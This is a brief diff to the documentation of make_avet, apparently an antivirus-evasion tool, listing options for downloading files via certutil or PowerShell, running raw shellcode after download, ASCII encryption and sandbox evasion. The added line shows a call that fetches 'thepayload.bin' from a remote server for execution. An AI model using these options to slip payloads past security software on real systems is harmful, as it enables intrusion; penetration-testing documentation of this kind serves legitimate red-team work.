@@ -50,6 +50,7 @@ Let's have a look at the options from make_avet, examples will be given below:
    -d powershell -> use powershell for downloading the file
       usage of -d certutil/powershell in combination with -f
       for executing the raw shellcode after downloading
+      call: pwn thepayload.bin http://server/thepayload.bin
 -E use avets ASCII encryption, often do not has to be used
    Can be used with -l
 -F use fopen sandbox evasion
